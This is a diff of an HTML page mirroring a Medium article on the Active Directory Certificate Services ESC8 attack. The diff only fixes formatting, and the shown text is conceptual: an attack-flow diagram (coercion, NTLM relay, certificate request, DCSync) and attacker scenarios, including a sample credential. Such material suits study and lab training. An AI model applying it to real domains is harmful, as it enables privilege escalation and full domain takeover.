@@ -13,8 +13,8 @@
 <script src="https://1200km.com/assets/theme-bootstrap.js"></script>
 <script src="https://1200km.com/assets/docusaurus-ecosystem.js?v=20260614-3" defer="defer"></script>
 <script src="https://1200km.com/assets/site-theme.js?v=20260721-shell" defer="defer"></script><link rel="stylesheet" href="/medium-blog-navigation/assets/css/styles.c1e57449.css">
-<script src="/medium-blog-navigation/assets/js/runtime~main.ab5f91ad.js" defer="defer"></script>
-<script src="/medium-blog-navigation/assets/js/main.7e23fde8.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/runtime~main.8d79bc55.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/main.4b84d819.js" defer="defer"></script>
 <meta name="robots" content="noindex,follow">
 </head>
 <body>
@@ -33,7 +33,7 @@
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="ecosystem-fit">Ecosystem Fit<a href="#ecosystem-fit" class="hash-link" aria-label="Direct link to Ecosystem Fit" title="Direct link to Ecosystem Fit" translate="no">​</a></h2>
 <p>This page mirrors the original Medium article into the 1200km.com Docusaurus ecosystem. The original article flow, images, screenshots, infographics, and technical blocks are preserved from the export.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="abstract">Abstract<a href="#abstract" class="hash-link" aria-label="Direct link to Abstract" title="Direct link to Abstract" translate="no">​</a></h2>
-<p>This article provides a comprehensive guide to the<strong>ADCS ESC8 attack</strong>(Active Directory Certificate Services Exploitation Scenario 8), one of the most sophisticated and dangerous Active Directory attack vectors. The ESC8 vulnerability allows attackers to relay NTLM authentication to ADCS HTTP endpoints, obtain certificates for high-privilege accounts, and achieve complete domain compromise through certificate-based Kerberos authentication.</p>
+<p>This article provides a comprehensive guide to the <strong>ADCS ESC8 attack</strong> (Active Directory Certificate Services Exploitation Scenario 8), one of the most sophisticated and dangerous Active Directory attack vectors. The ESC8 vulnerability allows attackers to relay NTLM authentication to ADCS HTTP endpoints, obtain certificates for high-privilege accounts, and achieve complete domain compromise through certificate-based Kerberos authentication.</p>
 <p>This attack was successfully demonstrated against a GOAD-Mini (Game of Active Directory) lab environment, showcasing how a misconfigured ADCS deployment can lead to catastrophic security breaches.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="table-of-contents">Table of Contents<a href="#table-of-contents" class="hash-link" aria-label="Direct link to Table of Contents" title="Direct link to Table of Contents" translate="no">​</a></h2>
 <ul>
@@ -85,7 +85,7 @@
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="introduction-to-adcs-and-esc8">Introduction to ADCS and ESC8<a href="#introduction-to-adcs-and-esc8" class="hash-link" aria-label="Direct link to Introduction to ADCS and ESC8" title="Direct link to Introduction to ADCS and ESC8" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-active-directory-certificate-services-adcs">What is Active Directory Certificate Services (ADCS)?<a href="#what-is-active-directory-certificate-services-adcs" class="hash-link" aria-label="Direct link to What is Active Directory Certificate Services (ADCS)?" title="Direct link to What is Active Directory Certificate Services (ADCS)?" translate="no">​</a></h3>
-<p>**Active Directory Certificate Services (ADCS)**is a Microsoft Windows Server role that provides a customizable public key infrastructure (PKI) for managing certificates used in authentication, encryption, and digital signatures. ADCS is commonly deployed in enterprise environments to:</p>
+<p><strong>Active Directory Certificate Services (ADCS)</strong> is a Microsoft Windows Server role that provides a customizable public key infrastructure (PKI) for managing certificates used in authentication, encryption, and digital signatures. ADCS is commonly deployed in enterprise environments to:</p>
 <ul>
 <li class="">
 <p>Issue certificates for user and computer authentication</p>
@@ -104,7 +104,7 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-esc8">What is ESC8?<a href="#what-is-esc8" class="hash-link" aria-label="Direct link to What is ESC8?" title="Direct link to What is ESC8?" translate="no">​</a></h3>
-<p><strong>ESC8</strong>(Exploitation Scenario 8) is a vulnerability in ADCS that occurs when<strong>Web Enrollment is enabled over HTTP</strong>instead of HTTPS. This misconfiguration allows attackers to:</p>
+<p><strong>ESC8</strong> (Exploitation Scenario 8) is a vulnerability in ADCS that occurs when <strong>Web Enrollment is enabled over HTTP</strong> instead of HTTPS. This misconfiguration allows attackers to:</p>
 <ul>
 <li class="">
 <p>Relay NTLM authentication to the ADCS HTTP endpoint</p>
@@ -119,118 +119,118 @@
 <p>Achieve complete domain compromise</p>
 </li>
 </ul>
-<p>**CVE Reference:**Part of the “Certified Pre-Owned” research by SpecterOps (2021)</p>
+<p><strong>CVE Reference:</strong> Part of the “Certified Pre-Owned” research by SpecterOps (2021)</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="understanding-the-vulnerability">Understanding the Vulnerability<a href="#understanding-the-vulnerability" class="hash-link" aria-label="Direct link to Understanding the Vulnerability" title="Direct link to Understanding the Vulnerability" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-root-cause">The Root Cause<a href="#the-root-cause" class="hash-link" aria-label="Direct link to The Root Cause" title="Direct link to The Root Cause" translate="no">​</a></h3>
-<p>The ESC8 vulnerability exists when ADCS Web Enrollment is configured to accept requests over<strong>unencrypted HTTP</strong>instead of requiring<strong>HTTPS</strong>. This creates an opportunity for NTLM relay attacks because:</p>
+<p>The ESC8 vulnerability exists when ADCS Web Enrollment is configured to accept requests over <strong>unencrypted HTTP</strong> instead of requiring <strong>HTTPS</strong>. This creates an opportunity for NTLM relay attacks because:</p>
 <ul>
 <li class="">
-<p><strong>HTTP doesn’t require SMB signing</strong>— Unlike SMB, HTTP endpoints don’t enforce message signing</p>
+<p><strong>HTTP doesn’t require SMB signing</strong> — Unlike SMB, HTTP endpoints don’t enforce message signing</p>
 </li>
 <li class="">
-<p><strong>NTLM authentication can be relayed</strong>— Attackers can intercept and relay NTLM authentication to the ADCS endpoint</p>
+<p><strong>NTLM authentication can be relayed</strong> — Attackers can intercept and relay NTLM authentication to the ADCS endpoint</p>
 </li>
 <li class="">
-<p><strong>Certificate requests are accepted</strong>— The ADCS server processes certificate requests from relayed authentication</p>
+<p><strong>Certificate requests are accepted</strong> — The ADCS server processes certificate requests from relayed authentication</p>
 </li>
 <li class="">
-<p><strong>No authentication validation</strong>— The server doesn’t verify the original authentication source</p>
+<p><strong>No authentication validation</strong> — The server doesn’t verify the original authentication source</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="attack-flow-diagram">Attack Flow Diagram<a href="#attack-flow-diagram" class="hash-link" aria-label="Direct link to Attack Flow Diagram" title="Direct link to Attack Flow Diagram" translate="no">​</a></h2>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">┌─────────────┐         ┌──────────────┐         ┌─────────────┐</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">│   Attacker  │         │  Relay Server│         │  ADCS Server│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">│             │         │              │         │             │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">└──────┬──────┘         └──────┬───────┘         └──────┬──────┘</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. Trigger Auth       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │──────────────────────&gt;│                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │    (PetitPotam, etc.) │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. NTLM Auth          │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │&lt;──────────────────────│                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">3</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. Relay NTLM         │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │───────────────────────&gt;│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. Cert Request       │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │&lt;───────────────────────│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">5</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. Certificate        │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │&lt;──────────────────────│                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">6</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. Use Cert </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">for</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Auth</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │───────────────────────────────────────────────&gt;│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">7</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. DCSync             │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │───────────────────────────────────────────────&gt;│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">┌─────────────┐         ┌──────────────┐         ┌─────────────┐</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">│   Attacker  │         │  Relay Server│         │  ADCS Server│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">│             │         │              │         │             │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">└──────┬──────┘         └──────┬───────┘         └──────┬──────┘</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ 1. Trigger Auth       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │──────────────────────&gt;│                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │    (PetitPotam, etc.) │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ 2. NTLM Auth          │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │&lt;──────────────────────│                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │ 3. Relay NTLM         │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │───────────────────────&gt;│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │ 4. Cert Request       │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │&lt;───────────────────────│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ 5. Certificate        │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │&lt;──────────────────────│                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ 6. Use Cert for Auth  │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │───────────────────────────────────────────────&gt;│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │ 7. DCSync             │                        │</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │───────────────────────────────────────────────&gt;│</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">       │                       │                        │</span><br></div></code></pre></div></div>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-esc8-is-so-sophisticated">Why ESC8 is So Sophisticated<a href="#why-esc8-is-so-sophisticated" class="hash-link" aria-label="Direct link to Why ESC8 is So Sophisticated" title="Direct link to Why ESC8 is So Sophisticated" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-multi-stage-attack-chain">1. Multi-Stage Attack Chain<a href="#1-multi-stage-attack-chain" class="hash-link" aria-label="Direct link to 1. Multi-Stage Attack Chain" title="Direct link to 1. Multi-Stage Attack Chain" translate="no">​</a></h3>
 <p>ESC8 is not a simple vulnerability — it requires orchestrating multiple attack techniques:</p>
 <ul>
 <li class="">
-<p><strong>NTLM Relay</strong>— Intercepting and relaying authentication</p>
+<p><strong>NTLM Relay</strong> — Intercepting and relaying authentication</p>
 </li>
 <li class="">
-<p><strong>Certificate Request</strong>— Understanding PKI and certificate templates</p>
+<p><strong>Certificate Request</strong> — Understanding PKI and certificate templates</p>
 </li>
 <li class="">
-<p><strong>Kerberos PKINIT</strong>— Certificate-based Kerberos authentication</p>
+<p><strong>Kerberos PKINIT</strong> — Certificate-based Kerberos authentication</p>
 </li>
 <li class="">
-<p><strong>Privilege Escalation</strong>— Using certificates to escalate privileges</p>
+<p><strong>Privilege Escalation</strong> — Using certificates to escalate privileges</p>
 </li>
 <li class="">
-<p><strong>Domain Compromise</strong>— Performing DCSync with certificate-based auth</p>
+<p><strong>Domain Compromise</strong> — Performing DCSync with certificate-based auth</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-requires-deep-technical-knowledge">2. Requires Deep Technical Knowledge<a href="#2-requires-deep-technical-knowledge" class="hash-link" aria-label="Direct link to 2. Requires Deep Technical Knowledge" title="Direct link to 2. Requires Deep Technical Knowledge" translate="no">​</a></h3>
 <p>Successfully executing ESC8 requires understanding:</p>
 <ul>
 <li class="">
-<p><strong>Active Directory Certificate Services</strong>— PKI infrastructure, certificate templates, enrollment</p>
+<p><strong>Active Directory Certificate Services</strong> — PKI infrastructure, certificate templates, enrollment</p>
 </li>
 <li class="">
-<p><strong>NTLM Protocol</strong>— Authentication flow, relay mechanisms, signing requirements</p>
+<p><strong>NTLM Protocol</strong> — Authentication flow, relay mechanisms, signing requirements</p>
 </li>
 <li class="">
-<p><strong>Kerberos Authentication</strong>— PKINIT, certificate-based authentication, ticket granting</p>
+<p><strong>Kerberos Authentication</strong> — PKINIT, certificate-based authentication, ticket granting</p>
 </li>
 <li class="">
-<p><strong>Certificate Templates</strong>— Permissions, enrollment rights, client authentication</p>
+<p><strong>Certificate Templates</strong> — Permissions, enrollment rights, client authentication</p>
 </li>
 <li class="">
-<p><strong>ADCS Configuration</strong>— Web Enrollment, HTTP vs HTTPS, security implications</p>
+<p><strong>ADCS Configuration</strong> — Web Enrollment, HTTP vs HTTPS, security implications</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-bypasses-traditional-defenses">3. Bypasses Traditional Defenses<a href="#3-bypasses-traditional-defenses" class="hash-link" aria-label="Direct link to 3. Bypasses Traditional Defenses" title="Direct link to 3. Bypasses Traditional Defenses" translate="no">​</a></h3>
 <p>ESC8 can bypass several security controls:</p>
 <ul>
 <li class="">
-<p><strong>SMB Signing</strong>— HTTP endpoints don’t require signing (unlike SMB)</p>
+<p><strong>SMB Signing</strong> — HTTP endpoints don’t require signing (unlike SMB)</p>
 </li>
 <li class="">
-<p><strong>Network Segmentation</strong>— If ADCS is accessible, the attack can work</p>
+<p><strong>Network Segmentation</strong> — If ADCS is accessible, the attack can work</p>
 </li>
 <li class="">
-<p><strong>Account Lockout Policies</strong>— No password attempts needed</p>
+<p><strong>Account Lockout Policies</strong> — No password attempts needed</p>
 </li>
 <li class="">
-<p><strong>Multi-Factor Authentication</strong>— Certificate-based auth may bypass MFA</p>
+<p><strong>Multi-Factor Authentication</strong> — Certificate-based auth may bypass MFA</p>
 </li>
 <li class="">
-<p><strong>Privileged Access Workstations</strong>— Attack works from any compromised system</p>
+<p><strong>Privileged Access Workstations</strong> — Attack works from any compromised system</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-stealthy-and-hard-to-detect">4. Stealthy and Hard to Detect<a href="#4-stealthy-and-hard-to-detect" class="hash-link" aria-label="Direct link to 4. Stealthy and Hard to Detect" title="Direct link to 4. Stealthy and Hard to Detect" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p><strong>No failed login attempts</strong>— Uses certificate authentication, not passwords</p>
+<p><strong>No failed login attempts</strong> — Uses certificate authentication, not passwords</p>
 </li>
 <li class="">
-<p><strong>Legitimate-looking traffic</strong>— Certificate requests appear normal</p>
+<p><strong>Legitimate-looking traffic</strong> — Certificate requests appear normal</p>
 </li>
 <li class="">
-<p><strong>Minimal network noise</strong>— Few connections required</p>
+<p><strong>Minimal network noise</strong> — Few connections required</p>
 </li>
 <li class="">
-<p><strong>Persistent access</strong>— Certificates can be used long-term</p>
+<p><strong>Persistent access</strong> — Certificates can be used long-term</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-real-world-impact">5. Real-World Impact<a href="#5-real-world-impact" class="hash-link" aria-label="Direct link to 5. Real-World Impact" title="Direct link to 5. Real-World Impact" translate="no">​</a></h3>
 <p>ESC8 is particularly dangerous because:</p>
 <ul>
 <li class="">
-<p><strong>ADCS is commonly deployed</strong>— Many enterprises use ADCS</p>
+<p><strong>ADCS is commonly deployed</strong> — Many enterprises use ADCS</p>
 </li>
 <li class="">
-<p><strong>Misconfiguration is common</strong>— HTTP Web Enrollment is often enabled</p>
+<p><strong>Misconfiguration is common</strong> — HTTP Web Enrollment is often enabled</p>
 </li>
 <li class="">
-<p><strong>High-value target</strong>— Can lead to complete domain compromise</p>
+<p><strong>High-value target</strong> — Can lead to complete domain compromise</p>
 </li>
 <li class="">
-<p><strong>Difficult to remediate</strong>— Requires ADCS reconfiguration</p>
+<p><strong>Difficult to remediate</strong> — Requires ADCS reconfiguration</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="when-this-attack-is-useful">When This Attack is Useful<a href="#when-this-attack-is-useful" class="hash-link" aria-label="Direct link to When This Attack is Useful" title="Direct link to When This Attack is Useful" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="scenario-1-initial-access-with-low-privileges">Scenario 1: Initial Access with Low Privileges<a href="#scenario-1-initial-access-with-low-privileges" class="hash-link" aria-label="Direct link to Scenario 1: Initial Access with Low Privileges" title="Direct link to Scenario 1: Initial Access with Low Privileges" translate="no">​</a></h3>
-<p>**Situation:**You have obtained low-privilege credentials (e.g., through phishing, password spraying, or credential stuffing).</p>
+<p><strong>Situation:</strong> You have obtained low-privilege credentials (e.g., through phishing, password spraying, or credential stuffing).</p>
 <p><strong>Why ESC8 Helps:</strong></p>
 <ul>
 <li class="">
@@ -244,9 +244,9 @@
 </li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Attacker has:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">TestUser:Password123!</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Attacker wants:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Domain</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Admin</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">access</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Solution:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Use</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ESC8</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">obtain</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Administrator</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">certificate</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Attacker has: TestUser:Password123!</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Attacker wants: Domain Admin access</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Solution: Use ESC8 to obtain Administrator certificate</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="scenario-2-network-access-but-no-valid-credentials">Scenario 2: Network Access but No Valid Credentials<a href="#scenario-2-network-access-but-no-valid-credentials" class="hash-link" aria-label="Direct link to Scenario 2: Network Access but No Valid Credentials" title="Direct link to Scenario 2: Network Access but No Valid Credentials" translate="no">​</a></h3>
-<p>**Situation:**You have network access but no valid domain credentials.</p>
+<p><strong>Situation:</strong> You have network access but no valid domain credentials.</p>
 <p><strong>Why ESC8 Helps:</strong></p>
 <ul>
 <li class="">
@@ -260,9 +260,9 @@
 </li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Attacker has:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Network</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">access,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">no</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">credentials</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Attacker does:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Trigger</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">DC</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">authentication</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">via</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">MS-RPRN</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Result:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Relay</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ADCS,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">obtain</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">DC</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">certificate</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Attacker has: Network access, no credentials</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Attacker does: Trigger DC authentication via MS-RPRN</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Result: Relay to ADCS, obtain DC certificate</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="scenario-3-bypassing-account-security-controls">Scenario 3: Bypassing Account Security Controls<a href="#scenario-3-bypassing-account-security-controls" class="hash-link" aria-label="Direct link to Scenario 3: Bypassing Account Security Controls" title="Direct link to Scenario 3: Bypassing Account Security Controls" translate="no">​</a></h3>
-<p>**Situation:**Target accounts have strong passwords, MFA, or account lockout policies.</p>
+<p><strong>Situation:</strong> Target accounts have strong passwords, MFA, or account lockout policies.</p>
 <p><strong>Why ESC8 Helps:</strong></p>
 <ul>
 <li class="">
@@ -276,9 +276,9 @@
 </li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Target:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Administrator account </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">with</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> MFA</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Problem:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Can</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;t brute force (lockout) or bypass MFA</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Solution:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ESC8 certificate authentication</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Target: Administrator account with MFA</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Problem: Can&#x27;t brute force (lockout) or bypass MFA</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Solution: ESC8 certificate authentication</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="scenario-4-lateral-movement-across-trusts">Scenario 4: Lateral Movement Across Trusts<a href="#scenario-4-lateral-movement-across-trusts" class="hash-link" aria-label="Direct link to Scenario 4: Lateral Movement Across Trusts" title="Direct link to Scenario 4: Lateral Movement Across Trusts" translate="no">​</a></h3>
-<p>**Situation:**You’ve compromised one domain and want to move to another.</p>
+<p><strong>Situation:</strong> You’ve compromised one domain and want to move to another.</p>
 <p><strong>Why ESC8 Helps:</strong></p>
 <ul>
 <li class="">
@@ -292,7 +292,7 @@
 </li>
 </ul>
